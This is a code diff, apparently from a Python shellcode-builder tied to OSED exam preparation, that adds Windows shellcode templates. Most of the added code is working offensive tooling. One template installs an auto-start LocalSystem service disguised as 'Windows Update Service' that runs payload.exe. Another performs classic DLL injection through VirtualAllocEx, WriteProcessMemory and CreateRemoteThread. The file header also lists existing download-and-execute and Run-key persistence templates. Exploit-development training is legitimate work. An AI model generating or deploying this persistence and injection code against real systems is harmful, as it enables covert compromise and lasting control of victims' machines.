@@ -18,6 +18,12 @@ Reference workflows:
   - url_download: URLDownloadToFileA single-call download + WinExec
   - url_download_to_userdir: GetUserNameA + URLDownloadToFileA + WinExec
   - registry_persistence: RegOpenKeyExA + RegSetValueExA for HKCU Run key
+  - create_process: CreateProcessA with STARTUPINFOA/PROCESS_INFORMATION
+  - service_persist: OpenSCManagerA + CreateServiceA + StartServiceA
+  - process_inject: OpenProcess + VirtualAllocEx + WriteProcessMemory +
+    CreateRemoteThread (DLL injection via LoadLibraryA)
+  - messagebox: LoadLibraryA(user32.dll) + MessageBoxA proof-of-concept
+  - file_write: CreateFileA + WriteFile + CloseHandle
 """
 from __future__ import annotations
 
@@ -2171,4 +2177,530 @@ class IRRegistryPersistenceTemplate(WorkflowTemplate):
             ("Value name", val),
             ("Value data (REG_SZ)", exe),
             ("Persistence: runs on user login", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# CreateProcessA workflow (10-arg call with structs)
+# ---------------------------------------------------------------------------
+
+_STARTF_USESTDHANDLES = 0x00000100
+
+
+def build_create_process_workflow(
+    command: str = "cmd.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the create_process reference workflow.
+
+    ZeroStruct(STARTUPINFOA) -> set cb -> ZeroStruct(PROCESS_INFORMATION) ->
+    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) ->
+    exit
+
+    Demonstrates the full 10-argument CreateProcessA call with struct
+    initialization, as required by the OSED exam pattern.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_create_process",
+        blocks=(
+            Block("entry", (
+                ConstructString("cmd", command),
+                AllocateStruct("si", "STARTUPINFOA"),
+                AllocateStruct("pi", "PROCESS_INFORMATION"),
+                ZeroStruct("si"),
+                WriteStructField("si", "cb", Immediate(0x44)),
+                ZeroStruct("pi"),
+                CallAPI(
+                    "CreateProcessA",
+                    arguments=(
+                        Immediate(0),       # lpApplicationName = NULL
+                        AddressOf("cmd"),   # lpCommandLine
+                        Immediate(0),       # lpProcessAttributes = NULL
+                        Immediate(0),       # lpThreadAttributes = NULL
+                        Immediate(0),       # bInheritHandles = FALSE
+                        Immediate(0),       # dwCreationFlags = 0
+                        Immediate(0),       # lpEnvironment = NULL
+                        Immediate(0),       # lpCurrentDirectory = NULL
+                        AddressOf("si"),    # lpStartupInfo
+                        AddressOf("pi"),    # lpProcessInformation
+                    ),
+                    result="cpa_ret",
+                ),
+                Compare("cpa_ret", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRCreateProcessTemplate(WorkflowTemplate):
+    """IR-backed create_process template (full 10-arg CreateProcessA)."""
+
+    def __init__(self) -> None:
+        super().__init__(build_create_process_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_create_process_workflow(
+            command=config.command or "cmd.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Command", config.command or "cmd.exe"),
+            ("Uses CreateProcessA (10 args)", ""),
+            ("STARTUPINFOA.cb = 0x44", ""),
+            ("PROCESS_INFORMATION zeroed before call", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Service persistence workflow (SCM)
+# ---------------------------------------------------------------------------
+
+
+def build_service_persist_workflow(
+    exe_path: str = r"C:\Users\Public\payload.exe",
+    service_name: str = "WindowsUpdate",
+    service_display_name: str = "Windows Update Service",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the service_persist reference workflow.
+
+    LoadLibraryA(advapi32.dll) ->
+    OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE) ->
+    CreateServiceA(13 args) ->
+    StartServiceA(handle, 0, NULL) ->
+    CloseServiceHandle x2 -> exit
+
+    Installs and starts a Windows service for persistence.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_service_persist",
+        blocks=(
+            Block("entry", (
+                ConstructString("advapi_dll", "advapi32.dll"),
+                ConstructString("svc_name", service_name),
+                ConstructString("svc_display", service_display_name),
+                ConstructString("exe_path", exe_path),
+                CallAPI(
+                    "LoadLibraryA",
+                    arguments=(AddressOf("advapi_dll"),),
+                    result="advapi_base",
+                ),
+                CallAPI(
+                    "OpenSCManagerA",
+                    arguments=(
+                        Immediate(0),       # lpMachineName = NULL (local)
+                        Immediate(0),       # lpDatabaseName = NULL
+                        Immediate(0x0002),  # SC_MANAGER_CREATE_SERVICE
+                    ),
+                    result="scm_handle",
+                ),
+                Compare("scm_handle", SuccessPredicate.NONZERO,
+                        true_block="create_svc", false_block="fail"),
+            )),
+            Block("create_svc", (
+                CallAPI(
+                    "CreateServiceA",
+                    arguments=(
+                        NameRef("scm_handle"),
+                        AddressOf("svc_name"),
+                        AddressOf("svc_display"),
+                        Immediate(0xF01FF),  # SERVICE_ALL_ACCESS
+                        Immediate(0x10),     # SERVICE_WIN32_OWN_PROCESS
+                        Immediate(0x02),     # SERVICE_AUTO_START
+                        Immediate(0x00),     # SERVICE_ERROR_IGNORE
+                        AddressOf("exe_path"),
+                        Immediate(0),        # lpLoadOrderGroup = NULL
+                        Immediate(0),        # lpdwTagId = NULL
+                        Immediate(0),        # lpDependencies = NULL
+                        Immediate(0),        # lpServiceStartName = NULL (LocalSystem)
+                        Immediate(0),        # lpPassword = NULL
+                    ),
+                    result="svc_handle",
+                ),
+                Compare("svc_handle", SuccessPredicate.NONZERO,
+                        true_block="start_svc", false_block="cleanup_scm"),
+            )),
+            Block("start_svc", (
+                CallAPI(
+                    "StartServiceA",
+                    arguments=(
+                        NameRef("svc_handle"),
+                        Immediate(0),       # dwNumServiceArgs = 0
+                        Immediate(0),       # lpServiceArgVectors = NULL
+                    ),
+                    result="start_ret",
+                ),
+                CallAPI(
+                    "CloseServiceHandle",
+                    arguments=(NameRef("svc_handle"),),
+                ),
+                CallAPI(
+                    "CloseServiceHandle",
+                    arguments=(NameRef("scm_handle"),),
+                ),
+                Compare("start_ret", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+            Block("cleanup_scm", (
+                CallAPI(
+                    "CloseServiceHandle",
+                    arguments=(NameRef("scm_handle"),),
+                ),
+                Jump("fail"),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRServicePersistTemplate(WorkflowTemplate):
+    """IR-backed service_persist template (SCM service installation)."""
+
+    def __init__(self) -> None:
+        super().__init__(build_service_persist_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_service_persist_workflow(
+            exe_path=config.exe_path or r"C:\Users\Public\payload.exe",
+            service_name=config.service_name or "WindowsUpdate",
+            service_display_name=config.service_display_name or "Windows Update Service",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        exe = config.exe_path or r"C:\Users\Public\payload.exe"
+        svc = config.service_name or "WindowsUpdate"
+        return [
+            ("Service name", svc),
+            ("Binary path", exe),
+            ("Start type", "SERVICE_AUTO_START (0x02)"),
+            ("Requires admin/SYSTEM privileges", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Process injection workflow (classic DLL injection pattern)
+# ---------------------------------------------------------------------------
+
+_PROCESS_ALL_ACCESS = 0x001FFFFF
+
+
+def build_process_inject_workflow(
+    target_pid: int = 1234,
+    dll_path: str = r"C:\Users\Public\payload.dll",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the process_inject reference workflow.
+
+    OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID) ->
+    VirtualAllocEx(hProc, NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_RWX) ->
+    WriteProcessMemory(hProc, remote_buf, &dll_path, len, NULL) ->
+    CreateRemoteThread(hProc, NULL, 0, LoadLibraryA, remote_buf, 0, NULL) ->
+    exit
+
+    Classic DLL injection via CreateRemoteThread + LoadLibraryA.
+    The target PID is embedded as an immediate; replace it at build time
+    or in the debug_runner.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_process_inject",
+        blocks=(
+            Block("entry", (
+                ConstructString("dll_path", dll_path),
+                ConstructString("kernel32_name", "kernel32.dll"),
+                ConstructString("loadlib_name", "LoadLibraryA"),
+                CallAPI(
+                    "GetModuleHandleA",
+                    arguments=(AddressOf("kernel32_name"),),
+                    result="k32_base",
+                ),
+                CallAPI(
+                    "GetProcAddress",
+                    arguments=(
+                        NameRef("k32_base"),
+                        AddressOf("loadlib_name"),
+                    ),
+                    result="loadlib_addr",
+                ),
+                CallAPI(
+                    "lstrlenA",
+                    arguments=(AddressOf("dll_path"),),
+                    result="path_len",
+                ),
+                CallAPI(
+                    "OpenProcess",
+                    arguments=(
+                        Immediate(_PROCESS_ALL_ACCESS),
+                        Immediate(0),       # bInheritHandle = FALSE
+                        Immediate(target_pid),
+                    ),
+                    result="hproc",
+                ),
+                Compare("hproc", SuccessPredicate.NONZERO,
+                        true_block="alloc_remote", false_block="fail"),
+            )),
+            Block("alloc_remote", (
+                CallAPI(
+                    "VirtualAllocEx",
+                    arguments=(
+                        NameRef("hproc"),
+                        Immediate(0),       # lpAddress = NULL
+                        NameRef("path_len"),
+                        Immediate(0x3000),  # MEM_COMMIT | MEM_RESERVE
+                        Immediate(0x40),    # PAGE_EXECUTE_READWRITE
+                    ),
+                    result="remote_buf",
+                ),
+                Compare("remote_buf", SuccessPredicate.NONZERO,
+                        true_block="write_memory", false_block="fail"),
+            )),
+            Block("write_memory", (
+                CallAPI(
+                    "WriteProcessMemory",
+                    arguments=(
+                        NameRef("hproc"),
+                        NameRef("remote_buf"),
+                        AddressOf("dll_path"),
+                        NameRef("path_len"),
+                        Immediate(0),       # lpNumberOfBytesWritten = NULL
+                    ),
+                    result="write_ret",
+                ),
+                Compare("write_ret", SuccessPredicate.NONZERO,
+                        true_block="create_thread", false_block="fail"),
+            )),
+            Block("create_thread", (
+                CallAPI(
+                    "CreateRemoteThread",
+                    arguments=(
+                        NameRef("hproc"),
+                        Immediate(0),       # lpThreadAttributes = NULL
+                        Immediate(0),       # dwStackSize = 0
+                        NameRef("loadlib_addr"),
+                        NameRef("remote_buf"),
+                        Immediate(0),       # dwCreationFlags = 0
+                        Immediate(0),       # lpThreadId = NULL
+                    ),
+                    result="hthread",
+                ),
+                Compare("hthread", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRProcessInjectTemplate(WorkflowTemplate):
+    """IR-backed process_inject template (DLL injection via CreateRemoteThread)."""
+
+    def __init__(self) -> None:
+        super().__init__(build_process_inject_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_process_inject_workflow(
+            target_pid=config.target_pid or 1234,
+            dll_path=config.dst_path or r"C:\Users\Public\payload.dll",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        pid = config.target_pid or 1234
+        dll = config.dst_path or r"C:\Users\Public\payload.dll"
+        return [
+            ("Target PID", str(pid)),
+            ("DLL path written to remote process", dll),
+            ("Injection: LoadLibraryA via CreateRemoteThread", ""),
+            ("Requires PROCESS_ALL_ACCESS on target", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# MessageBoxA workflow (proof-of-concept)
+# ---------------------------------------------------------------------------
+
+
+def build_messagebox_workflow(
+    message_text: str = "Hello from shellcode!",
+    message_title: str = "Shellcode PoC",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the messagebox reference workflow.
+
+    LoadLibraryA(user32.dll) -> MessageBoxA(NULL, text, title, MB_OK) -> exit
+
+    Simple proof-of-concept that displays a message box. Useful for exam
+    validation and demonstrating LoadLibraryA + API resolution chain.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_messagebox",
+        blocks=(
+            Block("entry", (
+                ConstructString("user32_dll", "user32.dll"),
+                ConstructString("msg_text", message_text),
+                ConstructString("msg_title", message_title),
+                CallAPI(
+                    "LoadLibraryA",
+                    arguments=(AddressOf("user32_dll"),),
+                    result="user32_base",
+                ),
+                Compare("user32_base", SuccessPredicate.NONZERO,
+                        true_block="show_msg", false_block="fail"),
+            )),
+            Block("show_msg", (
+                CallAPI(
+                    "MessageBoxA",
+                    arguments=(
+                        Immediate(0),           # hWnd = NULL
+                        AddressOf("msg_text"),
+                        AddressOf("msg_title"),
+                        Immediate(0),           # MB_OK
+                    ),
+                    result="msgbox_ret",
+                ),
+                Jump("success"),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRMessageBoxTemplate(WorkflowTemplate):
+    """IR-backed messagebox template (proof-of-concept)."""
+
+    def __init__(self) -> None:
+        super().__init__(build_messagebox_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_messagebox_workflow(
+            message_text=config.message_text or "Hello from shellcode!",
+            message_title=config.message_title or "Shellcode PoC",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Message text", config.message_text or "Hello from shellcode!"),
+            ("Title", config.message_title or "Shellcode PoC"),
+            ("Loads user32.dll via LoadLibraryA", ""),
+            ("MB_OK (dismiss to continue)", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# File write workflow (CreateFileA + WriteFile + CloseHandle)
+# ---------------------------------------------------------------------------
+
+
+def build_file_write_workflow(
+    dst_path: str = r"C:\Users\Public\output.txt",
+    file_content: str = "Written by shellcode",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the file_write reference workflow.
+
+    CreateFileA(dst, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, NORMAL, NULL) ->
+    lstrlenA(content) ->
+    WriteFile(handle, &content, len, &written, NULL) ->
+    CloseHandle(handle) -> exit
+
+    Demonstrates the full CreateFileA (7 args) + WriteFile chain.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_file_write",
+        blocks=(
+            Block("entry", (
+                ConstructString("dst_path", dst_path),
+                ConstructString("file_content", file_content),
+                AllocateLocal("bytes_written"),
+                CallAPI(
+                    "CreateFileA",
+                    arguments=(
+                        AddressOf("dst_path"),
+                        Immediate(0x40000000),  # GENERIC_WRITE
+                        Immediate(0),           # dwShareMode = 0 (exclusive)
+                        Immediate(0),           # lpSecurityAttributes = NULL
+                        Immediate(2),           # CREATE_ALWAYS
+                        Immediate(0x80),        # FILE_ATTRIBUTE_NORMAL
+                        Immediate(0),           # hTemplateFile = NULL
+                    ),
+                    result="hfile",
+                ),
+                Compare("hfile", SuccessPredicate.NONZERO,
+                        true_block="write_file", false_block="fail"),
+            )),
+            Block("write_file", (
+                CallAPI(
+                    "lstrlenA",
+                    arguments=(AddressOf("file_content"),),
+                    result="content_len",
+                ),
+                CallAPI(
+                    "WriteFile",
+                    arguments=(
+                        NameRef("hfile"),
+                        AddressOf("file_content"),
+                        NameRef("content_len"),
+                        AddressOf("bytes_written"),
+                        Immediate(0),           # lpOverlapped = NULL
+                    ),
+                    result="write_ret",
+                ),
+                CallAPI(
+                    "CloseHandle",
+                    arguments=(NameRef("hfile"),),
+                ),
+                Compare("write_ret", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRFileWriteTemplate(WorkflowTemplate):
+    """IR-backed file_write template (CreateFileA + WriteFile)."""
+
+    def __init__(self) -> None:
+        super().__init__(build_file_write_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_file_write_workflow(
+            dst_path=config.dst_path or r"C:\Users\Public\output.txt",
+            file_content=config.file_content or "Written by shellcode",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        dst = config.dst_path or r"C:\Users\Public\output.txt"
+        content = config.file_content or "Written by shellcode"
+        return [
+            ("Destination file", dst),
+            ("Content written", content),
+            ("Uses CreateFileA (7 args) + WriteFile", ""),
+            ("CREATE_ALWAYS overwrites existing", ""),
         ]
